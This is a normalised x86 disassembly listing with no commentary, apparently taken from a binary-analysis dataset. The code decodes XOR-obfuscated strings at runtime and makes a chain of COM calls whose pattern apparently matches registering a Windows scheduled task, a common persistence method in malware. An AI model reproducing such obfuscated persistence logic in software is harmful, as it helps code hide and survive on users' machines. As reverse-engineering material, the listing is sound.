mov [ ebp - 0x54 ] 0x0
call sub_1002f620
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x54 ]
push edx
lea edx [ ebp - 0x50 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x58 ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x60 ] ecx
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp - 0x60 ]
lea ecx [ ebx + 0x104 ]
sar eax 0x1
push eax
push edx
call sub_10034100
mov edx [ ebp - 0x58 ]
push edx
call edi
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebx + 0xf8 ]
push r--data
xor edi edi
lea ecx [ ebx + 0xe8 ]
mov [ ebp - 0x54 ] 0x0
call sub_100449d0
test eax eax
jne r-xdata
mov eax [ ebx + 0x114 ]
push r--data
xor edi edi
lea ecx [ ebx + 0x104 ]
call sub_100449d0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
xor ecx ebp
add eax 0x4
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x3 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10054a5a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_100651be
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_1007ec40
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_10054ae0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084fa3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
mov edi [ ebp + 0x8 ]
xor edx edx
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov al [ edi + 0x14 ]
mov [ esi + 0x14 ] al
mov eax [ edi + 0x18 ]
mov [ ebp - 0x4 ] edx
cmp eax edx
jne r-xdata
lea ecx [ esi + 0x18 ]
push eax
mov [ ecx ] edx
mov [ ecx + 0x4 ] dl
call sub_10024880
push edi
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10028d4a
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea eax [ edi + 0x1c ]
sub_10054b70
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
add eax [ ebx + 0x4 ]
push edi
mov edi ecx
cmp edi eax
jae r-xdata
cmp edi ecx
je r-xdata
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax [ ebx ]
add ecx [ esi ]
push edx
push eax
push ecx
call sub_1007f580
mov edx [ ebx + 0x4 ]
add esp 0xc
add [ esi + 0x4 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_10013bb0
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ecx
mov ebx eax
push edx
push ebx
call sub_1007f580
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006db40
mov [ esi ] ebx
mov ebx [ ebp + 0xc ]
add esp 0x1c
mov [ esi + 0x8 ] edi
add edi edi
cmp edi eax
jb r-xdata
sub_10054bf0
push esi
mov esi eax
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x10 ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov [ esi + 0x10 ] 0x0
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x50 ] 0x0
je r-xdata
push eax
call edi
add esi 0x54
cmp [ esi ] 0x0
je r-xdata
mov [ esi + 0x50 ] 0x0
pop edi
pop esi
retn
call sub_1001b370
sub_10054c60
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
lea eax [ ecx * 4 ]
push eax
call sub_1002e3ac
add esp 0x4
test eax eax
jne r-xdata
sub_10054cd2
push 0xc
push r--data
call sub_1007fad0
push 0xe
call sub_1002f3c9
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10054d39
call sub_1007fb15
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_1001b2d2
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_1001b2d2
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_10054d50
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
mov [ ebp - 0xbc ] 0x0
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb6
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0x14
jb r-xdata
xor eax eax
lea edx [ ebp - 0xbc ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x30 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
mov eax edx
lea esi [ eax + 0x2 ]
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
push edi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0x78 ]
call sub_10034100
mov ecx [ ebp - 0xc0 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebx + 0x88 ]
push r--data
xor edi edi
lea ecx [ ebx + 0x78 ]
call sub_100449d0
test eax eax
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0xb6
call sub_1002f620
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0x88 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
mov eax edx
lea esi [ eax + 0x2 ]
lea ecx [ ecx ]
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0x94 ]
call sub_10034100
mov ecx [ ebp - 0xc0 ]
mov edi [ SysFreeString@IAT ]
push ecx
call edi
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea edx [ ebp - 0xb8 ]
mov eax 0x14
call sub_1002f620
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0xb8 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
lea esi [ ebx + 0xb0 ]
push esi
call sub_10019010
mov ecx [ ebp - 0xc0 ]
push ecx
call edi
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
call sub_100449d0
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x5c ]
mov eax 0x77
call sub_1002f620
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0x5c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
lea eax [ edi + 0x6 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
add ebx 0xcc
push ebx
call sub_10019010
mov ecx [ ebp - 0xc0 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov esi r--data
mov ecx ebx
call sub_10045dd0
mov ecx [ ebp - 0x4 ]
movzx eax al
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x8
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x7
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10055050
push ebp
mov ebp esp
push 0xffffffff
push sub_100870db
mov eax [ fs : 0x0 ]
push eax
sub esp 0x170
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
push ebx
mov esi ecx
mov [ ebp - 0xd4 ] eax
call [ CoInitializeEx@IAT ]
test eax eax
js r-xdata
mov eax 0x1
jmp r-xdata
push ebx
push ebx
push ebx
push 0x3
push 0x6
push ebx
push ebx
push 0xffffffff
push ebx
call [ CoInitializeSecurity@IAT ]
cmp eax ebx
jge r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
xor ecx ecx
mov eax esi
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
lea edx [ eax + 0x2 ]
cmp eax 0x80010119
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xb8 ]
call sub_10034100
lea edx [ ebp - 0xcc ]
push edx
push r--data
push 0x1
push ebx
mov [ ebp - 0x4 ] ebx
push r--data
mov [ ebp - 0xcc ] ebx
call [ CoCreateInstance@IAT ]
cmp eax ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov esi [ VariantInit@IAT ]
lea ecx [ ebp - 0x144 ]
push ecx
call esi
mov edx [ ebp - 0x140 ]
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x138 ]
mov edi [ ebp - 0x144 ]
mov [ ebp - 0x128 ] edx
lea edx [ ebp - 0x154 ]
push edx
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] ecx
call esi
mov ecx [ ebp - 0x150 ]
mov eax [ ebp - 0x154 ]
mov edx [ ebp - 0x14c ]
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x10c ] eax
mov eax [ ebp - 0x148 ]
lea ecx [ ebp - 0x164 ]
push ecx
mov [ ebp - 0x104 ] edx
mov [ ebp - 0x100 ] eax
call esi
mov eax [ ebp - 0x160 ]
mov edx [ ebp - 0x164 ]
mov ecx [ ebp - 0x15c ]
mov [ ebp - 0xf0 ] eax
mov [ ebp - 0xf4 ] edx
mov edx [ ebp - 0x158 ]
lea eax [ ebp - 0x17c ]
push eax
mov [ ebp - 0xec ] ecx
mov [ ebp - 0xe8 ] edx
call esi
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x128 ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x124 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x120 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x10c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x108 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x104 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x100 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0xf4 ]
mov ecx [ ebp - 0xcc ]
mov edx [ ecx ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0xf0 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0xec ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0xe8 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x17c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x178 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x174 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x170 ]
mov [ eax + 0xc ] esi
mov eax [ edx + 0x28 ]
push ecx
call eax
mov esi [ VariantClear@IAT ]
lea ecx [ ebp - 0x17c ]
push ecx
mov edi eax
call esi
lea edx [ ebp - 0x164 ]
push edx
call esi
lea eax [ ebp - 0x154 ]
push eax
call esi
lea ecx [ ebp - 0x144 ]
push ecx
mov [ ebp - 0x4 ] bl
call esi
cmp edi ebx
jge r-xdata
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
lea edx [ ebp - 0x168 ]
xor eax eax
mov [ ebp - 0xc0 ] ebx
call sub_10021030
lea edx [ ebp - 0xc4 ]
push edx
lea edi [ ebp - 0x168 ]
call sub_100272b0
mov [ ebp - 0x4 ] 0x5
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xcc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xa4 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x1
jmp r-xdata
lea eax [ ebp - 0xc4 ]
push eax
mov edi r--data
call sub_100272b0
mov [ ebp - 0x4 ] 0x6
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ ebp - 0xcc ]
mov edx [ ecx ]
lea edi [ ebp - 0xc0 ]
push edi
push eax
mov eax [ edx + 0x1c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_100698c0
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xf8 ]
mov [ ebp - 0xf8 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xc0 ]
jmp r-xdata
mov eax [ ebp - 0xc0 ]
mov edx [ eax ]
push ebx
push ecx
push eax
mov eax [ edx + 0x3c ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_100698c0
mov eax [ ebp - 0xcc ]
lea edx [ ebp - 0xbc ]
push edx
mov [ ebp - 0xbc ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov edi eax
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jge r-xdata
mov eax [ ebp - 0xc0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xbc ]
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x28 ]
push r--data
push eax
call edx
mov edi eax
mov eax [ ebp - 0xf8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
lea ecx [ ebp - 0xb8 ]
call sub_100702e0
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xd8 ]
mov [ ebp - 0xd8 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x3c ]
call eax
cmp eax ebx
jl r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x5
call sub_10021030
lea eax [ ebp - 0xc4 ]
push eax
mov edi edx
call sub_100272b0
mov [ ebp - 0x4 ] 0x7
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0x110 ]
mov [ ebp - 0x110 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xd8 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x20 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_100698c0
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x38 ]
push 0x2
push eax
call edx
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x48 ]
push 0x1
push eax
call edx
mov edi eax
mov eax [ ebp - 0xd8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x110 ]
mov ecx [ eax ]
mov edx [ ecx + 0x58 ]
push 0xffffffff
push eax
call edx
mov edi eax
mov eax [ ebp - 0x110 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0x118 ]
mov [ ebp - 0x118 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0x118 ]
lea edx [ ebp - 0x114 ]
push edx
mov [ ebp - 0x114 ] ebx
mov ecx [ eax ]
push 0x9
push eax
mov eax [ ecx + 0x28 ]
call eax
mov edi eax
mov eax [ ebp - 0x118 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x114 ]
lea edx [ ebp - 0xd0 ]
push edx
mov [ ebp - 0xd0 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi eax
mov eax [ ebp - 0x114 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x8
call sub_10021030
lea eax [ ebp - 0xc4 ]
push eax
mov edi edx
call sub_100272b0
mov [ ebp - 0x4 ] 0x8
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x24 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_100698c0
lea edx [ ebp - 0x74 ]
mov eax 0x4
call sub_10021030
lea ecx [ ebp - 0xc4 ]
push ecx
mov edi edx
call sub_100272b0
mov [ ebp - 0x4 ] 0x9
mov eax [ eax ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xd0 ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x3c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_100698c0
lea edx [ ebp - 0x9c ]
mov eax 0x7
call sub_10021030
lea ecx [ ebp - 0xc4 ]
push ecx
mov edi edx
call sub_100272b0
mov [ ebp - 0x4 ] 0xa
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xbc ]
lea edx [ ebp - 0xe0 ]
mov [ ebp - 0xe0 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
js r-xdata
mov eax [ ebp - 0xd0 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x44 ]
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] bl
call sub_100698c0
lea edx [ ebp - 0x20 ]
mov eax 0x3
call sub_10021030
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov edi eax
mov eax [ ebp - 0xd0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xe0 ]
lea edx [ ebp - 0xfc ]
push edx
mov [ ebp - 0xfc ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x30 ]
call eax
mov edi eax
mov eax [ ebp - 0xe0 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0xfc ]
lea edx [ ebp - 0xdc ]
push edx
mov [ ebp - 0xdc ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov edi eax
mov eax [ ebp - 0xfc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0xa4 ] 0x8
mov edi [ ebp - 0xb8 ]
jae r-xdata
lea eax [ ebp - 0xc4 ]
push eax
call sub_100272b0
mov [ ebp - 0x4 ] 0xb
mov eax [ eax ]
cmp eax ebx
je r-xdata
lea edi [ ebp - 0xb8 ]
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0xd4 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_100272b0
mov [ ebp - 0x4 ] 0xc
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xdc ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x2c ]
push ecx
call eax
lea edi [ ebp - 0xc4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_100698c0
cmp [ ebp - 0xc8 ] ebx
jge r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax 0x8
push r--data
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x164 ] ax
call [ SysAllocString@IAT ]
mov [ ebp - 0x15c ] eax
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0xdc ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x34 ]
call eax
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] bl
call sub_100698c0
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebp - 0xc8 ] ebx
jl r-xdata
mov ecx [ ebp - 0x164 ]
mov edx [ ebp - 0x160 ]
mov edi [ VariantInit@IAT ]
mov [ ebp - 0xf4 ] ecx
mov [ ebp - 0xec ] eax
mov eax [ ebp - 0x158 ]
lea ecx [ ebp - 0x154 ]
push ecx
mov [ ebp - 0xf0 ] edx
mov [ ebp - 0xe8 ] eax
call edi
mov eax [ ebp - 0x150 ]
mov edx [ ebp - 0x154 ]
mov ecx [ ebp - 0x14c ]
mov [ ebp - 0x108 ] eax
mov [ ebp - 0x10c ] edx
mov edx [ ebp - 0x148 ]
lea eax [ ebp - 0x144 ]
push eax
mov [ ebp - 0x104 ] ecx
mov [ ebp - 0x100 ] edx
call edi
mov [ ebp - 0x4 ] 0xf
mov edx [ ebp - 0x140 ]
mov ecx [ ebp - 0x144 ]
mov eax [ ebp - 0x13c ]
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x12c ] ecx
mov ecx [ ebp - 0x138 ]
lea edx [ ebp - 0xd4 ]
push edx
mov edi r--data
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] ecx
call sub_100272b0
mov [ ebp - 0x4 ] 0x10
mov eax [ eax ]
cmp eax ebx
je r-xdata
push 0x8007000e
call sub_1003f6d0
mov [ ebp - 0xc8 ] ebx
mov eax [ eax ]
mov [ ebp - 0xc8 ] eax
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
call edx
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x130 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
lea ecx [ ebp - 0xb8 ]
call sub_100702e0
xor eax eax
mov edx [ eax ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0xbc ]
jmp r-xdata
mov edi [ ebp - 0xf4 ]
lea eax [ ebp - 0x130 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0xf0 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0xec ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0xe8 ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x10c ]
push 0x2
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x108 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0x104 ]
mov ecx [ ebp - 0xc0 ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x100 ]
mov edx [ ecx ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x12c ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov edi [ ebp - 0x128 ]
mov [ eax + 0x4 ] edi
mov edi [ ebp - 0x124 ]
mov [ eax + 0x8 ] edi
mov edi [ ebp - 0x120 ]
mov [ eax + 0xc ] edi
mov eax [ ebp - 0xbc ]
push 0x6
push eax
mov eax [ ebp - 0xc8 ]
push eax
push ecx
mov ecx [ edx + 0x44 ]
call ecx
lea edi [ ebp - 0xd4 ]
